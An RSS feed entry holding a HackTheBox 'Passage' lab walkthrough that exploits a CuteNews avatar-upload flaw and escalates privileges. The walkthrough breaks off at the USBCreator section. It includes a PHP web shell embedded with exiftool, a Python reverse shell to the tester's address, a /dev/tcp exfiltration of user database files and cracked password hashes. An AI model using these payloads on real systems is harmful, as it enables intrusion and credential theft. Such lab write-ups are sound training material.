<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Webshell on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/webshell/</link>
    <description>Recent content in Webshell on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Fri, 07 May 2021 19:30:38 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/webshell/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Passage</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-passage/</link>
      <pubDate>Fri, 07 May 2021 19:30:38 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-passage/</guid>
      <description>Passage is a medium difficulty Linux machine from HackTheBox that features a news management software called CuteNews. The software is known to be vulnerable to a remote code execution, allowing an attacker to gain a foothold on the system via the avatar upload feature. Looking into the source files of the software discovers a few password hashes that can be recovered using a dictionary attack. One of the recovered passwords can be used to escalate to the first user, and it turns out that this user is using the same SSH key as the second user.</description>
      <content:encoded><![CDATA[<p>Passage is a medium difficulty Linux machine from HackTheBox that features a news management software called CuteNews. The software is known to be vulnerable to a remote code execution, allowing an attacker to gain a foothold on the system via the avatar upload feature. Looking into the source files of the software discovers a few password hashes that can be recovered using a dictionary attack. One of the recovered passwords can be used to escalate to the first user, and it turns out that this user is using the same SSH key as the second user. There is an unpatched package called USBCreator that allows an attacker to perform Arbitrary File Write as root without supplying a password.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>
<p>CuteNews 2.1.2 exploitation</p>
</li>
<li>
<p>USBCreator D-bus exploitation</p>
</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>hashcat (Windows) - <a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></li>
<li>Exiftool - <a href="https://exiftool.org/">https://exiftool.org/</a></li>
<li>gdbus - Preinstalled in the target machine.</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial nmap discovers two open ports, SSH on port 22 and HTTP running Apache web server on port 80.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «passage» «10.10.14.31»
$ mkdir nmap; nmap -sC -sV -oN initial-passage -v 10.10.10.206
<span style="color:#75715e"># Nmap 7.80 scan initiated Sat Sep  5 15:39:12 2020 as: nmap -sC -sV -oN initial-passage -v 10.10.10.206</span>
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.206
Host is up <span style="color:#f92672">(</span>0.074s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">998</span> closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey:
|   <span style="color:#ae81ff">2048</span> 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Passage News
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p>As SSH usually requires credentials, I&rsquo;ll enumerate the web server on port 80.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>The page presenting a kind of news website called &ldquo;Passage News&rdquo;.</p>
<p><div class="img-container"><img src="imgs/d7ac9042cb934e58912a75669587968e.png" alt="d7ac9042cb934e58912a75669587968e"  /></div>
</p>
<p>The post titled &ldquo;Implemented Fail2Ban&rdquo; states that they have implemented the Fail2Ban feature. Knowing this, I will avoid any kind of brute force attack here.</p>
<p><div class="img-container"><img src="imgs/9eb82005d29d4c4e85aaa22c778203b0.png" alt="9eb82005d29d4c4e85aaa22c778203b0"  /></div>
</p>
<p>Inspecting the page sources finds a directory called &ldquo;CuteNews&rdquo;. I also find the hostname as <code>passage.htb</code>.</p>
<p><div class="img-container"><img src="imgs/c78e8e637c114e089fc80228b7b92d20.png" alt="c78e8e637c114e089fc80228b7b92d20"  /></div>
</p>
<p>Adding <code>/CuteNews</code> to the URL redirects me to a login page.</p>
<p><div class="img-container"><img src="imgs/7fa49ed1b8fc47d6ad274565962e4007.png" alt="7fa49ed1b8fc47d6ad274565962e4007"  /></div>
</p>
<p>I can register as normal user.</p>
<p><div class="img-container"><img src="imgs/image-20210508014328401.png" alt="image-20210508014328401"  /></div>
</p>
<h4 id="searchsploit">Searchsploit</h4>
<p>I threw &ldquo;CuteNews 2.1.2&rdquo; to <code>searchsploit</code> and it returned several exploits.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «passage» «10.10.14.31»
$ searchsploit <span style="color:#e6db74">&#39;CuteNews 2.1.2&#39;</span>
------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                     |  Path
------------------------------------------------------------------- ---------------------------------
CuteNews 2.1.2 - <span style="color:#e6db74">&#39;avatar&#39;</span> Remote Code Execution <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>       | php/remote/46698.rb
CuteNews 2.1.2 - Arbitrary File Deletion                           | php/webapps/48447.txt
CuteNews 2.1.2 - Authenticated Arbitrary File Upload               | php/webapps/48458.txt
------------------------------------------------------------------- ---------------------------------
</code></pre></div><p>I&rsquo;ll go with the &lsquo;avatar&rsquo; RCE.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="cutenews-cve-2019-11447">CuteNews CVE-2019-11447</h4>
<p>It turns out the &lsquo;avatar&rsquo; RCE exploit was a CVE. The exploit module description as follows:</p>
<blockquote>
<p>This module exploits a command execution vulnerability in CuteNews prior to 2.1.2.
The attacker can infiltrate the server through the avatar upload process in the profile area.
There is no realistic control of the $imgsize function in &ldquo;/core/modules/dashboard.php&rdquo;
Header content of the file can be changed and the control can be bypassed.
We can use the &ldquo;GIF&rdquo; header for this process.
An ordinary user is enough to exploit the vulnerability. No need for admin user.
The module creates a file for you and allows RCE.</p>
</blockquote>
<p>I can also exploit this manually.</p>
<p>I still have the payload that I made using <code>exiftool</code> in my previous <a href="/writeup/htb-magic">Magic write-up</a>. If I don&rsquo;t have it, I can create a new one, embedding a PHP web shell as a comment.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «passage» «10.10.14.31»
$ exiftool -Comment<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> iamf.jpg
</code></pre></div><p>I&rsquo;ll rename my jpeg image to <code>iamfr.php</code>, and then I&rsquo;ll upload it as my avatar (Dashboard &ndash;&gt; Personal Options).</p>
<p><div class="img-container"><img src="imgs/image-20210508022032162.png" alt="image-20210508022032162"  /></div>
</p>
<p>The image is located at <code>http://passage.htb/CuteNews/uploads/avatar_iamf_iamfr.php</code></p>
<p><img src="imgs/image-20210508023129512.png" alt="image-20210508023129512" style="zoom:67%;" /></p>
<p>I&rsquo;ll send a Python reverse shell through the web shell and capture it on my <code>nc</code> listener.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">http://passage.htb/CuteNews/uploads/avatar_iamf_iamfr.php?cmd<span style="color:#f92672">=</span>python3 -c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.31&#34;,9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39;</span>
</code></pre></div><p>I have an interactive shell now.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «passage» «10.10.14.31»
$ rlwrap nc -nvlp <span style="color:#ae81ff">9001</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.31<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.206<span style="color:#f92672">]</span> <span style="color:#ae81ff">37062</span>
bash: cannot set terminal process group <span style="color:#f92672">(</span>1678<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
bash: no job control in this shell
www-data@passage:/var/www/html/CuteNews/uploads$ id
id
uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
www-data@passage:/var/www/html/CuteNews/uploads$ python -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
www-data@passage:/var/www/html/CuteNews/uploads$
www-data@passage:/var/www/html/CuteNews/uploads$ export TERM<span style="color:#f92672">=</span>xterm-256color
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-paul">Shell as paul</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>There are two users in home directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@passage:/var/www/html/CuteNews/uploads$ ls -l /home
ls -l /home
total <span style="color:#ae81ff">8</span>
drwxr-x--- <span style="color:#ae81ff">17</span> nadav nadav  <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">5</span> 09:21 nadav
drwxr-x--- <span style="color:#ae81ff">17</span> paul  paul   <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">5</span> 08:32 paul
</code></pre></div><p>On <code>/var/www/html/CuteNews/cdata/users</code>, I finds a bunch of PHP files contains data encoded in base64. Some of the file contains PHP tags.</p>
<p><div class="img-container"><img src="imgs/image-20210508025611714.png" alt="image-20210508025611714"  /></div>
</p>
<blockquote>
<p>Apologize for the image quality (also for the white background), it was recovered from my KeepNote app.</p>
</blockquote>
<p>I&rsquo;ll send those files to my machine as one file using <code>cat</code> and <code>dev/tcp</code> trick</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@passage:/var/www/html/CuteNews/cdata/users$ cat *.php &gt; /dev/tcp/10.10.14.31/9000
</code></pre></div><p>I redirected it to a file called <code>cdata.users</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «passage» «10.10.14.31»
$ nc -nvlp <span style="color:#ae81ff">9000</span> &gt; cdata.users
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9000</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.31<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.206<span style="color:#f92672">]</span> <span style="color:#ae81ff">55022</span>
</code></pre></div><p>I can perform a bulk decode on the file contents after removing the PHP tags.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «passage» «10.10.14.31»
$ cat cdata.users| sed <span style="color:#e6db74">&#39;s/&lt;?php[^&gt;]*&gt;//g&#39;</span> | base64 -d
cat cdata.users| sed <span style="color:#e6db74">&#39;s/&lt;?php[^&gt;]*&gt;//g&#39;</span> | base64 -d
a:1:<span style="color:#f92672">{</span>s:5:<span style="color:#e6db74">&#34;email&#34;</span>;a:1:<span style="color:#f92672">{</span>s:16:<span style="color:#e6db74">&#34;paul@passage.htb&#34;</span>;s:10:<span style="color:#e6db74">&#34;paul-coles&#34;</span>;<span style="color:#f92672">}}</span>a:1:<span style="color:#f92672">{</span>s:2:<span style="color:#e6db74">&#34;id&#34;</span>;a:1:<span style="color:#f92672">{</span>i:1598829833;s:6:<span style="color:#e6db74">&#34;egre55&#34;</span>;<span style="color:#f92672">}}</span>a:1:<span style="color:#f92672">{</span>s:5:<span style="color:#e6db74">&#34;email&#34;</span>;a:1:<span style="color:#f92672">{</span>s:15:<span style="color:#e6db74">&#34;ahaha@gmail.com&#34;</span>;s:8:<span style="color:#e6db74">&#34;ivanpogi&#34;</span>;<span style="color:#f92672">}}</span>a:2:<span style="color:#f92672">{</span>s:5:<span style="color:#e6db74">&#34;email&#34;</span>;a:1:<span style="color:#f92672">{</span>s:15:<span style="color:#e6db74">&#34;egre55@test.com&#34;</span>;s:6:<span style="color:#e6db74">&#34;egre55&#34;</span>;<span style="color:#f92672">}</span>s:4:<span style="color:#e6db74">&#34;name&#34;</span>;a:1:<span style="color:#f92672">{</span>s:4:<span style="color:#e6db74">&#34;debo&#34;</span>;a:11:<span style="color:#f92672">{</span>s:2:<span style="color:#e6db74">&#34;id&#34;</span>;s:10:<span style="color:#e6db74">&#34;1599412470&#34;</span>;s:4:<span style="color:#e6db74">&#34;name&#34;</span>;s:4:<span style="color:#e6db74">&#34;debo&#34;</span>;s:3:<span style="color:#e6db74">&#34;acl&#34;</span>;s:1:<span style="color:#e6db74">&#34;4&#34;</span>;s:5:<span style="color:#e6db74">&#34;email&#34;</span>;s:13:<span style="color:#e6db74">&#34;debo@debo.com&#34;</span>;s:4:<span style="color:#e6db74">&#34;nick&#34;</span>;s:4:<span style="color:#e6db74">&#34;debo&#34;</span>;s:4:<span style="color:#e6db74">&#34;pass&#34;</span>;s:64:<span style="color:#e6db74">&#34;b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52&#34;</span>;s:4:<span style="color:#e6db74">&#34;more&#34;</span>;s:60:<span style="color:#e6db74">&#34;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==&#34;</span>;s:6:<span style="color:#e6db74">&#34;avatar&#34;</span>;s:20:<span style="color:#e6db74">&#34;avatar_debo_bash.php&#34;</span>
...&lt;SNIP&gt;...
</code></pre></div><p>And that was a mess.</p>
<p>Among those outputs, this one concerns me.</p>
<pre><code>&quot;pass&quot;;s:64:&quot;b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52&quot;
</code></pre><p><code>hash-identifier</code> identifies it as SHA-256.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «passage» «192.168.43.234»
$ hash-identifier 84c7cd94cb0d818d27b16d4290d13703d380c54a4d3696fff4587b2862bf6068
   <span style="color:#75715e">#########################################################################</span>
   <span style="color:#75715e">#     __  __                     __           ______    _____           #</span>
   <span style="color:#75715e">#    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #</span>
   <span style="color:#75715e">#    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #</span>
   <span style="color:#75715e">#     \ \  _  \  /&#39;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #</span>
   <span style="color:#75715e">#      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #</span>
   <span style="color:#75715e">#       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #</span>
   <span style="color:#75715e">#        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #</span>
   <span style="color:#75715e">#                                                             By Zion3R #</span>
   <span style="color:#75715e">#                                                    www.Blackploit.com #</span>
   <span style="color:#75715e">#                                                   Root@Blackploit.com #</span>
   <span style="color:#75715e">#########################################################################</span>
--------------------------------------------------

Possible Hashs:
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SHA-256
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Haval-256
...&lt;SNIP&gt;...
</code></pre></div><p>It turns out that those exfiltrated files are how CuteNews stores its database (flat-file database, like <code>/etc/passwd</code>).</p>
<p><div class="img-container"><img src="imgs/image-20210508032901929.png" alt="image-20210508032901929"  /></div>
</p>
<p>Knowing that, I can add another filter using <code>grep</code> to grab the password hashes.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «passage» «192.168.43.234»
$ cat cdata.users| sed <span style="color:#e6db74">&#39;s/&lt;?php[^&gt;]*&gt;//g&#39;</span> | base64 -d | grep -o -E -e <span style="color:#e6db74">&#34;[0-9a-f]{64}&#34;</span>
b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
231cd4eb21af3071fd441d5bb7e42dc5fd6f606cd20a8e3c158b7e7c2923f426
41e5653fc7aeb894026d6bb7b2db7f65902b454945fa8fd65a6327047b5277fb
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
03d09a66086da4ea6482d717ef1b33e23867afd965e2074e342584157393f91c
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
84c7cd94cb0d818d27b16d4290d13703d380c54a4d3696fff4587b2862bf6068
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9
59195c6c541c8307f1da2d1e768d6f2280c984df217ad5f4c64c3542b04111a4
</code></pre></div><h4 id="cracking-the-hashes">Cracking the Hashes</h4>
<p><code>hashcat</code> recovered five passwords.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./hashcat.exe -m <span style="color:#ae81ff">1400</span> hashes/passage.hashes ../rockyou.txt -O --show
b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52:debo
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:password
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1
e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9:hacker
59195c6c541c8307f1da2d1e768d6f2280c984df217ad5f4c64c3542b04111a4:mario
</code></pre></div><h4 id="su---paul">SU - paul</h4>
<p>I tried to spray the passwords on SSH, but it wanted an SSH key. I tried again with <code>su</code>, and password <code>atlanta1</code> worked on <code>paul</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@passage:/home$ su paul 
su paul
Password: atlanta1
paul@passage:~$ 
</code></pre></div><h3 id="shell-as-nadav">Shell as nadav</h3>
<p>Escalating from <code>paul</code> to <code>nadav</code> is pretty straight forward, I found out that user <code>nadav</code> uses the same SSH keys as user <code>paul</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">paul@passage:~/.ssh$ cat id_rsa.pub <span style="color:#f92672">&amp;&amp;</span> authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
</code></pre></div><p>So I can just SSH from <code>paul</code> to <code>nadav</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">paul@passage:~/.ssh$ ssh nadav@passage.htb
Last login: Sun Sep  <span style="color:#ae81ff">6</span> 11:12:03 <span style="color:#ae81ff">2020</span> from 127.0.0.1
nadav@passage:~$ id
id
uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>nadav<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>nadav<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>nadav<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,113<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,128<span style="color:#f92672">(</span>sambashare<span style="color:#f92672">)</span>
</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration-1">Internal enumeration</h4>
<p>Since <code>nadav</code> is a member of the <code>sudo</code> group, I can just type <code>sudo su</code> to escalate to root, but unfortunately it requires <code>nadav</code>&rsquo;s password.</p>
<p>So I looking around <code>nadav</code>&rsquo;s home directory, and there is a <code>.viminfo</code> file.</p>
<p><div class="img-container"><img src="imgs/c0375013a91f483582b37eebffa521d4.png" alt="c0375013a91f483582b37eebffa521d4"  /></div>
</p>
<p>The file contains the following information.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">...&lt;SNIP&gt;...
# Command Line History (newest to oldest):
:wq
:%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g


...&lt;SNIP&gt;...
# File marks:
&#39;0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
&#39;1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# Jumplist (newest first):
-&#39;  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-&#39;  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-&#39;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-&#39;  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-&#39;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-&#39;  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# History of marks within files (newest to oldest):

&gt; /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
        &#34;       12      7

&gt; /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
        &#34;       2       0
        .       2       0
        +       2       0
</code></pre></div><p>The history of files points to these two configuration files:</p>
<ul>
<li><code>/etc/dbus-1/system.d/com.ubuntu.USBCreator.conf</code></li>
<li><code>/etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf</code></li>
</ul>
<p>The <code>51-ubuntu-admin.conf</code> defines there are only two groups that can be used for authentication when administrator authentication is needed, <code>sudo</code> and <code>admin</code>. This file is used by <a href="https://www.freedesktop.org/software/polkit/docs/0.105/pklocalauthority.8.html">Polkit</a>, which allows unprivileged process to communicate with the privileged ones. In the GUI, the prompt that asks you to enter a password when performing an administrative tasks are using Polkit.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nadav@passage:~$ cat /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
<span style="color:#f92672">[</span>Configuration<span style="color:#f92672">]</span>
AdminIdentities<span style="color:#f92672">=</span>unix-group:sudo;unix-group:admin
</code></pre></div><p>I don&rsquo;t really understand in depth about <code>com.ubuntu.USBCreator.conf</code>. What I know is, this configuration file is used by a service called “com.ubuntu.USBCreator” that is owned by root. The ones that can invoke the methods on this service are constrained by PolicyKit/Polkit, and they are anyone in the <code>sudo</code> or the <code>admin</code> group (defined by the <code>51-ubuntu-admin.conf</code> file)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">nadav@passage:~$ cat /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
<span style="color:#75715e">&lt;!DOCTYPE busconfig PUBLIC
</span><span style="color:#75715e"> &#34;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN&#34;
</span><span style="color:#75715e"> &#34;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd&#34;&gt;</span>
<span style="color:#f92672">&lt;busconfig&gt;</span>

  <span style="color:#75715e">&lt;!-- Only root can own the service --&gt;</span>
  <span style="color:#f92672">&lt;policy</span> <span style="color:#a6e22e">user=</span><span style="color:#e6db74">&#34;root&#34;</span><span style="color:#f92672">&gt;</span>
    <span style="color:#f92672">&lt;allow</span> <span style="color:#a6e22e">own=</span><span style="color:#e6db74">&#34;com.ubuntu.USBCreator&#34;</span><span style="color:#f92672">/&gt;</span>
  <span style="color:#f92672">&lt;/policy&gt;</span>

  <span style="color:#75715e">&lt;!-- Allow anyone to invoke methods (further constrained by
</span><span style="color:#75715e">       PolicyKit privileges --&gt;</span>
  <span style="color:#f92672">&lt;policy</span> <span style="color:#a6e22e">context=</span><span style="color:#e6db74">&#34;default&#34;</span><span style="color:#f92672">&gt;</span>
    <span style="color:#f92672">&lt;allow</span> <span style="color:#a6e22e">send_destination=</span><span style="color:#e6db74">&#34;com.ubuntu.USBCreator&#34;</span>
           <span style="color:#a6e22e">send_interface=</span><span style="color:#e6db74">&#34;com.ubuntu.USBCreator&#34;</span><span style="color:#f92672">/&gt;</span>
    <span style="color:#f92672">&lt;allow</span> <span style="color:#a6e22e">send_destination=</span><span style="color:#e6db74">&#34;com.ubuntu.USBCreator&#34;</span>
           <span style="color:#a6e22e">send_interface=</span><span style="color:#e6db74">&#34;org.freedesktop.DBus.Introspectable&#34;</span><span style="color:#f92672">/&gt;</span>
    <span style="color:#f92672">&lt;allow</span> <span style="color:#a6e22e">send_destination=</span><span style="color:#e6db74">&#34;com.ubuntu.USBCreator&#34;</span>
           <span style="color:#a6e22e">send_interface=</span><span style="color:#e6db74">&#34;org.freedesktop.DBus.Properties&#34;</span><span style="color:#f92672">/&gt;</span>
  <span style="color:#f92672">&lt;/policy&gt;</span>

<span style="color:#f92672">&lt;/busconfig&gt;</span>
</code></pre></div><p>From here, From here, it looks only <code>nadav</code> that can invoke the methods of this service</p>
<h4 id="usbcreator-d-bus-interface-vulnerability">USBCreator D-Bus Interface Vulnerability</h4>
